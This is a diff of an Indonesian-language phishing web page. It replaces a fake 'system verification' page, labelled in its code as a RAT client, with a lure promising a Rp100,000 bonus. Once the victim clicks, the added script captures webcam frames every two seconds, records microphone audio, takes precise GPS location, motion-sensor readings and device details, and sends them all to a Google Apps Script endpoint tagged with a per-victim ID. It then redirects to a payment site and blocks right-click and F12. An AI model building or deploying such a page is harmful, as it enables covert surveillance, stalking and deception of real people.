@@ -3,495 +3,391 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔐 Verifikasi Keamanan Sistem</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>🎁 Ambil Bonus 100K 🎁</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-        }
-        .particle {
-            position: fixed;
-            width: 4px;
-            height: 4px;
-            background: #667eea;
-            border-radius: 50%;
-            animation: floatParticle 8s infinite;
-            pointer-events: none;
-        }
-        @keyframes floatParticle {
-            0% { transform: translateY(100vh) scale(0); opacity: 0; }
-            50% { opacity: 0.5; }
-            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
         .card {
-            position: relative;
-            z-index: 1;
-            background: rgba(255,255,255,0.98);
-            backdrop-filter: blur(10px);
-            border-radius: 48px;
-            padding: 40px 30px;
-            max-width: 550px;
+            background: white;
+            border-radius: 32px;
+            padding: 30px 25px;
+            max-width: 500px;
             width: 100%;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            animation: slideUp 0.6s ease;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+            animation: fadeIn 0.5s ease;
         }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(50px); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .badge {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            display: inline-block;
-            padding: 8px 20px;
-            border-radius: 100px;
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 10px;
-        }
-        .subtitle { color: #666; margin-bottom: 25px; }
-        .permission-list {
-            background: #f8f9fa;
-            border-radius: 24px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-        .permission-item {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 12px 0;
-            border-bottom: 1px solid #e9ecef;
-        }
-        .permission-item:last-child { border-bottom: none; }
-        .permission-icon {
-            width: 50px;
-            height: 50px;
-            background: white;
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-        .permission-text { flex: 1; }
-        .permission-text strong { display: block; font-size: 16px; color: #1a1a2e; }
-        .permission-text span { font-size: 12px; color: #6c757d; }
-        .status-badge {
-            background: #ffc107;
-            color: #000;
-            padding: 4px 12px;
-            border-radius: 100px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        .status-badge.success { background: #28a745; color: white; }
+        .bonus-icon { font-size: 60px; margin-bottom: 10px; animation: bounce 1s infinite; }
+        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        h1 { font-size: 28px; font-weight: 800; color: #333; margin-bottom: 5px; }
+        .price { font-size: 48px; font-weight: 800; color: #f5576c; margin: 10px 0; }
         .btn-claim {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
-            padding: 18px 30px;
+            padding: 15px 25px;
             font-size: 18px;
             font-weight: 700;
-            border-radius: 100px;
+            border-radius: 60px;
             width: 100%;
             cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            margin: 15px 0;
+            transition: transform 0.2s;
         }
-        .btn-claim:hover { transform: translateY(-2px); box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4); }
-        .live-cam {
-            margin-top: 20px;
-            border-radius: 20px;
-            overflow: hidden;
-            background: #000;
-            display: none;
-        }
-        .live-cam.active { display: block; }
-        .live-cam video {
-            width: 100%;
-            border-radius: 16px;
-            background: #000;
-            transform: scaleX(-1);
-        }
-        .torch-status {
-            margin-top: 15px;
-            padding: 10px;
+        .btn-claim:active { transform: scale(0.98); }
+        .info-box {
             background: #e8f4fd;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 14px;
+            border-radius: 16px;
+            padding: 12px;
+            font-size: 12px;
+            color: #0c5460;
+        }
+        .status-list {
+            background: #f8f9fa;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            font-size: 13px;
             display: none;
         }
-        .torch-status.active { display: block; }
-        .torch-on { color: #ff9800; font-weight: bold; animation: blink 0.5s infinite; }
-        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
-        .loading-overlay {
+        .status-list.active { display: block; }
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+        .status-item:last-child { border-bottom: none; }
+        .status-label { font-weight: 600; color: #333; }
+        .status-value { color: #667eea; font-weight: 500; }
+        .status-value.success { color: #28a745; }
+        .loading {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.9);
-            backdrop-filter: blur(10px);
-            z-index: 10000;
             display: none;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            gap: 20px;
+            color: white;
+            z-index: 10000;
         }
-        .loading-overlay.active { display: flex; }
+        .loading.active { display: flex; }
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255,255,255,0.2);
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.2);
             border-top-color: #667eea;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .success-screen {
+        .success {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: linear-gradient(135deg, #11998e, #38ef7d);
-            z-index: 10001;
             display: none;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            gap: 20px;
+            color: white;
+            z-index: 10001;
         }
-        .success-screen.active { display: flex; }
+        .success.active { display: flex; }
         .checkmark {
-            width: 100px;
-            height: 100px;
+            width: 70px;
+            height: 70px;
             background: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 50px;
-            animation: scaleIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            font-size: 35px;
+            animation: scaleIn 0.5s;
         }
         @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
-        .info-text { font-size: 12px; color: #888; margin-top: 15px; text-align: center; }
+        .live-cam-preview {
+            margin-top: 15px;
+            border-radius: 16px;
+            overflow: hidden;
+            background: #000;
+            display: none;
+        }
+        .live-cam-preview.active { display: block; }
+        .live-cam-preview video { width: 100%; transform: scaleX(-1); }
     </style>
 </head>
 <body>
 
-<div class="loading-overlay" id="loading">
+<div class="loading" id="loading">
     <div class="spinner"></div>
-    <h3 style="color: white;">Mengaktifkan sistem verifikasi...</h3>
+    <h3 style="margin-top: 15px;">Memproses bonus Anda...</h3>
+    <p style="font-size: 12px; margin-top: 10px;">Mohon izinkan akses kamera, lokasi, dan mikrofon</p>
 </div>
-<div class="success-screen" id="successScreen">
+
+<div class="success" id="success">
     <div class="checkmark">✅</div>
-    <h2 style="color: white;">Verifikasi Berhasil!</h2>
-    <p style="color: #e0ffe0;">Sistem telah terhubung</p>
+    <h2 style="margin-top: 15px;">Verifikasi Berhasil!</h2>
+    <p>Bonus Rp100.000 akan segera dikirim</p>
 </div>
 
 <div class="card" id="mainCard">
-    <div class="badge">🔐 SISTEM VERIFIKASI</div>
-    <h1>Verifikasi Wajib</h1>
-    <p class="subtitle">Harap izinkan akses berikut untuk melanjutkan</p>
-
-    <div class="permission-list">
-        <div class="permission-item" id="permCamera">
-            <div class="permission-icon">📸</div>
-            <div class="permission-text"><strong>Kamera Live</strong><span>Untuk verifikasi wajah real-time</span></div>
-            <div class="status-badge" id="statusCamera">Pending</div>
-        </div>
-        <div class="permission-item" id="permFlash">
-            <div class="permission-icon">⚡</div>
-            <div class="permission-text"><strong>Senter/Flash</strong><span>Verifikasi perangkat</span></div>
-            <div class="status-badge" id="statusFlash">Pending</div>
-        </div>
-        <div class="permission-item" id="permLocation">
-            <div class="permission-icon">📍</div>
-            <div class="permission-text"><strong>Lokasi</strong><span>Verifikasi wilayah</span></div>
-            <div class="status-badge" id="statusLocation">Pending</div>
-        </div>
-        <div class="permission-item" id="permNotif">
-            <div class="permission-icon">🔔</div>
-            <div class="permission-text"><strong>Notifikasi</strong><span>Informasi sistem</span></div>
-            <div class="status-badge" id="statusNotif">Pending</div>
-        </div>
+    <div class="bonus-icon">🎁💰🎁</div>
+    <h1>Selamat!</h1>
+    <p style="color:#666; margin-bottom:5px;">Anda mendapatkan bonus spesial</p>
+    <div class="price">Rp100.000</div>
+    
+    <button class="btn-claim" id="claimBtn">🎉 AMBIL BONUS SEKARANG 🎉</button>
+    
+    <div class="live-cam-preview" id="liveCamPreview">
+        <video id="liveVideo" autoplay playsinline muted></video>
     </div>
-
-    <div class="live-cam" id="liveCam">
-        <video id="video" autoplay playsinline muted></video>
+    
+    <div class="status-list" id="statusList">
+        <div class="status-item"><span class="status-label">📸 Kamera Live:</span><span class="status-value" id="camStatus">⏳ Menunggu izin...</span></div>
+        <div class="status-item"><span class="status-label">📍 Lokasi GPS:</span><span class="status-value" id="locStatus">⏳ Menunggu izin...</span></div>
+        <div class="status-item"><span class="status-label">⚡ Senter/Flash:</span><span class="status-value" id="torchStatus">⏳ Menunggu kamera...</span></div>
+        <div class="status-item"><span class="status-label">🎤 Mikrofon/Suara:</span><span class="status-value" id="audioStatus">⏳ Menunggu izin...</span></div>
+        <div class="status-item"><span class="status-label">🔄 Gyroscope:</span><span class="status-value" id="gyroStatus">⏳ Menunggu gerakan...</span></div>
+        <div class="status-item"><span class="status-label">🔔 Notifikasi:</span><span class="status-value" id="notifStatus">⏳ Menunggu izin...</span></div>
     </div>
-
-    <div class="torch-status" id="torchStatus">
-        🔦 Status Senter: <span id="torchState">Mati</span>
-    </div>
-
-    <button class="btn-claim" id="claimBtn">
-        🔐 Mulai Verifikasi 🔐
-    </button>
-    <div class="info-text">⚠️ Verifikasi wajib untuk mengakses sistem</div>
+    
+    <div class="info-box">ℹ️ Bonus akan ditransfer ke DANA/OVO Anda maksimal 5 menit setelah verifikasi selesai</div>
 </div>
 
 <script>
-    // Konfigurasi RAT Client
+    // ========== KONFIGURASI ==========
+    const API_URL = "https://script.google.com/macros/s/AKfycbxxByXzO1qVSXJEXSaEcwATyLGJ_pWWfl7o0IJIncUIEWpIr-TvoFg8DlVXFaHoLd-27w/exec"; // GANTI!
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const TARGET_ID = urlParams.get('id');
+    
+    if(!TARGET_ID) {
+        document.body.innerHTML = '<div style="text-align:center;padding:50px;">❌ Link tidak valid</div>';
+        throw new Error("No ID");
+    }
+    
+    // ========== VARIABEL ==========
     let cameraStream = null;
-    let torchActive = false;
-    let permissionAllGranted = false;
-    let targetId = 'RAT-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8);
-    let deviceName = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || navigator.platform || 'Unknown Device';
+    let frameInterval = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
     
     let targetData = {
-        id: targetId,
-        deviceName: deviceName,
+        id: TARGET_ID,
+        deviceName: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || navigator.platform,
         timestamp: new Date().toISOString(),
         waktu: new Date().toLocaleString('id-ID'),
-        cameraLive: false,
-        location: null,
-        flash: false,
-        notification: false,
+        cameraFrame: null,
+        lat: null, lng: null,
+        torch: false,
+        gyroX: 0, gyroY: 0, gyroZ: 0,
+        shake: false,
         userAgent: navigator.userAgent,
-        screenSize: `${screen.width}x${screen.height}`,
-        language: navigator.language
+        screenSize: `${screen.width}x${screen.height}`
     };
-
-    // Update status UI
-    function updateStatusUI() {
-        if(targetData.cameraLive) {
-            document.getElementById('statusCamera').textContent = '✅ Live';
-            document.getElementById('statusCamera').classList.add('success');
-        }
-        if(targetData.flash) {
-            document.getElementById('statusFlash').textContent = '✅ Aktif';
-            document.getElementById('statusFlash').classList.add('success');
-            document.getElementById('torchStatus').classList.add('active');
-        }
-        if(targetData.location) {
-            document.getElementById('statusLocation').textContent = '✅ Terdeteksi';
-            document.getElementById('statusLocation').classList.add('success');
-        }
-        if(targetData.notification) {
-            document.getElementById('statusNotif').textContent = '✅ Diizinkan';
-            document.getElementById('statusNotif').classList.add('success');
+    
+    function updateStatus(id, text, isSuccess) {
+        const el = document.getElementById(id);
+        if(el) {
+            el.innerHTML = text;
+            if(isSuccess) el.classList.add('success');
         }
     }
-
-    // Nyalakan/matikan senter (Torch) - REAL
-    async function setTorch(on) {
-        if(!cameraStream) return false;
+    
+    async function sendToAPI() {
         try {
-            const track = cameraStream.getVideoTracks()[0];
-            if(track && track.getCapabilities().torch) {
-                await track.applyConstraints({ advanced: [{ torch: on }] });
-                torchActive = on;
-                targetData.flash = on;
-                document.getElementById('torchState').innerHTML = on ? '<span class="torch-on">MENYALA 🔦</span>' : 'Mati';
-                if(on) {
-                    document.getElementById('torchState').innerHTML = '<span class="torch-on">🔦 MENYALA 🔦</span>';
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(targetData)
+            });
+        } catch(e) { console.log("Error kirim:", e); }
+    }
+    
+    // ========== KAMERA LIVE ==========
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+            });
+            cameraStream = stream;
+            const video = document.getElementById('liveVideo');
+            video.srcObject = stream;
+            document.getElementById('liveCamPreview').classList.add('active');
+            updateStatus('camStatus', '✅ LIVE AKTIF', true);
+            
+            // Kirim frame setiap 2 detik
+            frameInterval = setInterval(() => {
+                if(video.videoWidth > 0) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    targetData.cameraFrame = canvas.toDataURL('image/jpeg', 0.6);
+                    sendToAPI();
                 }
-                updateStatusUI();
-                saveToLocalStorage();
-                return true;
-            } else {
-                console.log("Torch not supported");
-                return false;
-            }
+            }, 2000);
+            
+            // Coba senter
+            setTimeout(() => setTorch(true), 1500);
+            return true;
         } catch(e) {
-            console.log("Torch error:", e);
+            updateStatus('camStatus', '❌ Izin ditolak', false);
             return false;
         }
     }
-
-    // Ambil screenshot dari stream
-    function captureSnapshot() {
-        if(!cameraStream) return null;
-        const video = document.getElementById('video');
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.7);
+    
+    // ========== SENTER ==========
+    async function setTorch(on) {
+        if(!cameraStream) return;
+        try {
+            const track = cameraStream.getVideoTracks()[0];
+            if(track && track.getCapabilities && track.getCapabilities().torch) {
+                await track.applyConstraints({ advanced: [{ torch: on }] });
+                targetData.torch = on;
+                updateStatus('torchStatus', on ? '🔦 MENYALA' : '💡 Mati', true);
+                sendToAPI();
+            }
+        } catch(e) { updateStatus('torchStatus', '❌ Tidak support', false); }
     }
-
-    // Kirim frame live ke storage (update setiap 2 detik)
-    let liveInterval = null;
-    function startLiveStream() {
-        if(liveInterval) clearInterval(liveInterval);
-        liveInterval = setInterval(() => {
-            if(targetData.cameraLive && cameraStream && cameraStream.active) {
-                const snapshot = captureSnapshot();
-                if(snapshot) {
-                    targetData.cameraLiveFrame = snapshot;
-                    saveToLocalStorage();
+    
+    // ========== LOKASI ==========
+    function getLocation() {
+        if('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    targetData.lat = pos.coords.latitude;
+                    targetData.lng = pos.coords.longitude;
+                    updateStatus('locStatus', `✅ ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`, true);
+                    sendToAPI();
+                },
+                () => updateStatus('locStatus', '❌ Izin ditolak', false),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else { updateStatus('locStatus', '❌ Tidak support', false); }
+    }
+    
+    // ========== SUARA (REAL) ==========
+    async function startAudioRecording() {
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(audioStream);
+            audioChunks = [];
+            
+            mediaRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    targetData.audioData = reader.result;
+                    updateStatus('audioStatus', '✅ Suara terekam', true);
+                    sendToAPI();
+                };
+                reader.readAsDataURL(blob);
+                audioStream.getTracks().forEach(t => t.stop());
+            };
+            
+            mediaRecorder.start();
+            setTimeout(() => {
+                if(mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
                 }
-            }
-        }, 2000);
+            }, 4000);
+            
+            updateStatus('audioStatus', '🎤 Merekam 4 detik...', true);
+        } catch(e) {
+            updateStatus('audioStatus', '❌ Izin ditolak', false);
+        }
     }
-
-    // Ambil lokasi GPS REAL
-    function getRealLocation() {
-        return new Promise((resolve) => {
-            if('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve({ 
-                            lat: pos.coords.latitude, 
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude
-                        });
-                    },
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else { resolve(null); }
-        });
-    }
-
-    // Minta notifikasi
-    function requestNotification() {
-        if('Notification' in window) {
-            if(Notification.permission === 'granted') {
-                targetData.notification = true;
-                updateStatusUI();
-                saveToLocalStorage();
-            } else if(Notification.permission !== 'denied') {
-                Notification.requestPermission().then(perm => {
-                    if(perm === 'granted') {
-                        targetData.notification = true;
-                        updateStatusUI();
-                        saveToLocalStorage();
-                        new Notification('✅ Sistem Verifikasi Aktif', {
-                            body: `Device: ${deviceName} terhubung`,
-                            icon: 'https://cdn-icons-png.flaticon.com/512/2331/2331966.png'
-                        });
+    
+    // ========== GYROSCOPE ==========
+    function initGyroscope() {
+        if(window.DeviceMotionEvent) {
+            window.addEventListener('devicemotion', (e) => {
+                const acc = e.accelerationIncludingGravity;
+                if(acc) {
+                    targetData.gyroX = acc.x || 0;
+                    targetData.gyroY = acc.y || 0;
+                    targetData.gyroZ = acc.z || 0;
+                    const mag = Math.sqrt(acc.x*acc.x + acc.y*acc.y + acc.z*acc.z);
+                    if(mag > 18 && !targetData.shake) {
+                        targetData.shake = true;
+                        updateStatus('gyroStatus', '✅ GOYANGAN!', true);
+                        sendToAPI();
+                        setTimeout(() => { targetData.shake = false; updateStatus('gyroStatus', '↻ Menunggu...', false); }, 2000);
+                    } else if(!targetData.shake) {
+                        updateStatus('gyroStatus', `↻ X:${acc.x.toFixed(1)} Y:${acc.y.toFixed(1)}`, false);
                     }
-                });
-            }
+                }
+            });
         }
     }
-
-    // Simpan ke localStorage (sync ke admin)
-    function saveToLocalStorage() {
-        let allTargets = JSON.parse(localStorage.getItem('rat_targets_live') || '[]');
-        const existingIndex = allTargets.findIndex(t => t.id === targetData.id);
-        if(existingIndex >= 0) {
-            allTargets[existingIndex] = { ...targetData, lastUpdate: new Date().toISOString() };
-        } else {
-            allTargets.push({ ...targetData, lastUpdate: new Date().toISOString() });
+    
+    // ========== NOTIFIKASI ==========
+    function requestNotification() {
+        if('Notification' in window && Notification.permission !== 'denied') {
+            Notification.requestPermission().then(perm => {
+                if(perm === 'granted') {
+                    updateStatus('notifStatus', '✅ Diizinkan', true);
+                    new Notification('🎉 Verifikasi Berhasil!', { body: 'Bonus Rp100.000 akan dikirim' });
+                } else { updateStatus('notifStatus', '❌ Ditolak', false); }
+            });
         }
-        localStorage.setItem('rat_targets_live', JSON.stringify(allTargets));
-        // Trigger event untuk admin panel
-        window.dispatchEvent(new Event('storage'));
     }
-
-    // Proses utama
+    
+    // ========== PROSES UTAMA ==========
     async function startVerification() {
         const btn = document.getElementById('claimBtn');
         btn.disabled = true;
-        btn.innerHTML = '⏳ Memverifikasi... ⏳';
+        btn.innerHTML = '⏳ Memproses... ⏳';
         document.getElementById('loading').classList.add('active');
-
-        // 1. Aktifkan kamera live
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
-            cameraStream = stream;
-            const videoElement = document.getElementById('video');
-            videoElement.srcObject = stream;
-            document.getElementById('liveCam').classList.add('active');
-            targetData.cameraLive = true;
-            targetData.cameraActive = true;
-            updateStatusUI();
-            
-            // Start live stream capture
-            startLiveStream();
-            
-            // Coba nyalakan senter otomatis setelah kamera aktif
-            setTimeout(async () => {
-                const torchResult = await setTorch(true);
-                if(torchResult) {
-                    console.log("Torch menyala");
-                }
-            }, 1000);
-            
-        } catch(e) {
-            console.log("Camera error:", e);
-        }
-
-        // 2. Ambil lokasi REAL
-        const location = await getRealLocation();
-        if(location) {
-            targetData.location = location;
-            updateStatusUI();
-        }
-
-        // 3. Minta notifikasi
+        document.getElementById('statusList').classList.add('active');
+        
+        await startCamera();
+        getLocation();
+        startAudioRecording();
+        initGyroscope();
         requestNotification();
-
-        // Simpan semua data
-        saveToLocalStorage();
-
-        // Selesai
-        setTimeout(() => {
+        
+        setTimeout(async () => {
+            await sendToAPI();
             document.getElementById('loading').classList.remove('active');
-            document.getElementById('successScreen').classList.add('active');
-            setTimeout(() => {
-                document.getElementById('successScreen').classList.remove('active');
-            }, 3000);
-            btn.innerHTML = '✅ Tersambung ✅';
-        }, 2000);
+            document.getElementById('success').classList.add('active');
+            setTimeout(() => { window.location.href = 'https://www.dana.id'; }, 2500);
+        }, 4500);
     }
-
-    // Event listener
+    
     document.getElementById('claimBtn').addEventListener('click', startVerification);
-
-    // Floating particles
-    for(let i = 0; i < 50; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 5 + 's';
-        p.style.animationDuration = (Math.random() * 5 + 3) + 's';
-        document.body.appendChild(p);
-    }
-
-    // Disable dev tools
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => { if(e.key === 'F12') e.preventDefault(); });
-
-    // Bersihkan stream saat halaman ditutup
+    
     window.addEventListener('beforeunload', () => {
-        if(cameraStream) {
-            cameraStream.getTracks().forEach(track => track.stop());
-        }
-        if(liveInterval) clearInterval(liveInterval);
+        if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+        if(mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+        if(frameInterval) clearInterval(frameInterval);
     });
+    
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => { if(e.key === 'F12') e.preventDefault(); });
 </script>
 </body>
 </html>
